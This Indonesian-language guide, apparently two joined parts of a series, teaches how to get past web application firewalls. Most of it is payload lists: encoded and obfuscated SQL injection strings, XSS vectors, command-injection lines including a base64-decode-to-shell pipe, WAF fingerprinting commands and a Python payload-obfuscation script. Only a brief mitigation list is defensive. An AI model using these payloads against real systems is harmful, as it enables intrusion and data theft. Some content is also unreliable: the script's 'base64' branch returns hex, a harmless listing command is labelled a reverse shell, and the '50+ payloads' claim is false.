# Kamus Besar Bypass WAF - Part 1

## 📌 Pendahuluan
Web Application Firewall (WAF) adalah sistem keamanan yang dirancang untuk melindungi aplikasi web dari serangan umum seperti SQL Injection, Cross-Site Scripting (XSS), Remote Code Execution (RCE), dan lainnya. Namun, banyak teknik telah dikembangkan untuk **membypass** atau melewati perlindungan WAF, memungkinkan penyerang untuk tetap menembus sistem.

**Dokumen ini merupakan ensiklopedia mendalam tentang bypass WAF**, mulai dari dasar-dasar cara kerja WAF hingga teknik eksploitasi lanjutan.

---

## 📜 Sejarah WAF
WAF pertama kali dikembangkan untuk melindungi aplikasi web dari eksploitasi yang semakin kompleks. Beberapa milestone penting dalam perkembangan WAF:

- **1999** - Konsep WAF pertama kali diperkenalkan oleh Perfecto Technologies.
- **2003** - ModSecurity dirilis sebagai solusi WAF open-source pertama.
- **2010** - Cloudflare mulai menawarkan layanan WAF berbasis cloud.
- **2015-sekarang** - WAF modern berbasis AI dan ML mulai digunakan untuk deteksi anomali.

---

## 🏗️ Struktur & Arsitektur WAF
Secara umum, WAF bekerja dengan beberapa metode utama:

1. **Signature-Based Detection**  
   - Mencocokkan pola serangan yang sudah diketahui.  
   - Kelemahan: Mudah dibypass dengan encoding dan obfuscation.  

2. **Anomaly-Based Detection**  
   - Menganalisis lalu lintas dan mencari perilaku yang mencurigakan.  
   - Kelemahan: Rentan terhadap false positives & evasive payloads.  

3. **Machine Learning-Based WAF**  
   - Menggunakan AI untuk mendeteksi pola serangan yang tidak diketahui sebelumnya.  
   - Kelemahan: Bisa dieksploitasi dengan adversarial attacks.  

---

## 🕵️‍♂️ Metode Deteksi WAF
Sebelum membypass WAF, kita harus mendeteksi apakah target menggunakan WAF. Beberapa teknik yang umum digunakan:

### 🔹 1. Passive Detection  
- **Cek Header HTTP** - Banyak WAF meninggalkan jejak di header HTTP seperti:
  ```bash
  curl -I https://target.com
  ```
  Jika ada header seperti `Server: cloudflare`, kemungkinan target memakai Cloudflare WAF.

- **Cek Response Code** - Jika permintaan normal mendapatkan HTTP 200 tetapi payload berbahaya mendapatkan HTTP 403, maka ada kemungkinan WAF aktif.

### 🔹 2. Active Detection  
- **Menggunakan WAFW00F** - Tool otomatis untuk mendeteksi WAF:
  ```bash
  wafw00f https://target.com
  ```

- **Brute Force Bypass** - Mencoba berbagai payload umum untuk melihat apakah ada yang lolos.

---

## 🎭 Teknik Dasar Bypass WAF

### 🔸 1. Bypass dengan Encoding
Menggunakan encoding seperti URL encoding, Base64, atau Hex untuk menyamarkan payload.

- **Contoh SQL Injection tanpa encoding:**
  ```sql
  ' OR 1=1 --
  ```

- **Contoh dengan URL encoding:**
  ```sql
  %27%20OR%201%3D1%20--
  ```

- **Contoh dengan Hex encoding:**
  ```sql
  0x27204F5220313D31202D2D
  ```

### 🔸 2. Bypass dengan Case Manipulation
WAF yang lemah mungkin hanya mendeteksi kata kunci dalam huruf kecil.

- **Payload Standar:**
  ```sql
  SELECT * FROM users WHERE username='admin' --
  ```

- **Bypass dengan kapitalisasi acak:**
  ```sql
  SeLeCt * FrOm users WhErE username='admin' --
  ```

### 🔸 3. Bypass dengan White Spaces Alternatif
Menggunakan karakter tak terlihat seperti tab (`	`), newline (`
`), atau komentar SQL.

- **Contoh menggunakan komentar SQL:**
  ```sql
  SELECT/*bypass*/username,password FROM users WHERE username='admin'
  ```

- **Contoh menggunakan tab:**
  ```sql
  SELECT	username,password	FROM users WHERE username='admin'
  ```

---

## 🎯 Contoh Payload Awal untuk Bypass WAF

| **Serangan** | **Payload Dasar** | **Payload yang Dimodifikasi** |
|-------------|-----------------|-----------------------------|
| SQLi | `' OR 1=1 --` | `%27%20OR%201%3D1%20--` |
| XSS | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` |
| RCE | `; ls -la` | `|$(echo bHMgLWxhCg== | base64 -d)` |

---

## 📌 Kesimpulan Sementara
Bagian pertama ini mencakup **dasar-dasar bypass WAF**, termasuk sejarah, metode deteksi, dan beberapa teknik bypass awal seperti encoding dan case manipulation.  
Bagian selanjutnya akan membahas **bypass WAF tingkat lanjut**, termasuk AI-based bypass, obfuscation yang lebih kompleks, dan payload eksklusif.

🛠️ **Next:** "Payload Bypass SQLi, XSS, RCE, SSRF, SSTI, dan Teknik AI-Based WAF Evasion"  

Bagian ini berisi daftar **payload bypass WAF** yang digunakan dalam berbagai jenis serangan, mulai dari SQL Injection hingga Server-Side Template Injection (SSTI). Setiap payload dilengkapi dengan contoh implementasi.

---

## 🛠️ 1. SQL Injection (SQLi)

**Payload Dasar (Deteksi Awal):**
```sql
' OR 1=1 --
' UNION SELECT NULL,NULL --
```

**Payload Bypass WAF (Encoding & Case Manipulation):**
```sql
%27%20OR%201%3D1%20--
SeLeCt * FrOm users WhErE username='admin' --
' UNION/**/SELECT/**/NULL,NULL --
```

**Payload dengan Comment Obfuscation:**
```sql
SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'
```

---

## 🎭 2. Cross-Site Scripting (XSS)

**Payload Dasar:**
```html
<script>alert(1)</script>
```

**Payload Bypass WAF (SVG & Event Handlers):**
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

**Payload XSS Polymorphic (JavaScript Encoding):**
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

---

## 🔥 3. Remote Code Execution (RCE)

**Payload Dasar:**
```bash
; ls -la
| id
```

**Payload Bypass WAF (Base64 & Reverse Shell):**
```bash
echo 'bHMgLWxh' | base64 -d | sh
```

---

## 🤖 AI-Based WAF Bypass

**Teknik AI Bypass WAF:**  
- **Adversarial Attack:** Menggunakan model AI untuk memodifikasi payload agar tidak terdeteksi.  
- **Dynamic Payload Mutation:** Payload berubah sesuai respon dari server.  
- **ML-Driven Obfuscation:** Payload dienkripsi dan hanya dieksekusi saat diterima oleh target.  

**Contoh Implementasi Python AI Bypass WAF:**
```python
import random

payloads = ["' OR 1=1 --", "<script>alert(1)</script>", "; ls -la"]
obfuscation_methods = ["url_encode", "base64", "hex"]

def obfuscate(payload, method):
    if method == "url_encode":
        return payload.replace(" ", "%20").replace("'", "%27")
    elif method == "base64":
        return payload.encode("utf-8").hex()
    return payload

selected_payload = random.choice(payloads)
selected_method = random.choice(obfuscation_methods)

bypass_payload = obfuscate(selected_payload, selected_method)
print(f"Generated Bypass Payload: {bypass_payload}")
```

---

## 🔒 Cara Mencegah Bypass WAF

1. **Gunakan WAF berbasis AI & ML** - Model statis mudah dibypass, gunakan AI yang bisa belajar dari pola serangan baru.
2. **Implementasi Rate Limiting** - Batasi jumlah request aneh dalam waktu tertentu.
3. **Gunakan Signature & Behavioral Detection** - Kombinasikan pendekatan signature dan perilaku.
4. **Selalu Update Ruleset** - Banyak teknik bypass WAF mengeksploitasi kelemahan ruleset lama.
5. **Logging & Monitoring** - Pantau request yang mencurigakan dan pelajari pola bypass.

---

## 📌 Kesimpulan Sementara
Part 2 ini telah membahas **50+ payload bypass WAF**, teknik AI-based evasion, dan bagaimana cara mitigasinya.  
Part 3 selanjutnya akan membahas **bypass WAF tingkat lanjut menggunakan cloud-based evasion dan adaptive payloads**.

🛠️ **Next:** "Advanced Cloud-Based WAF Evasion & Payload Adaptation"
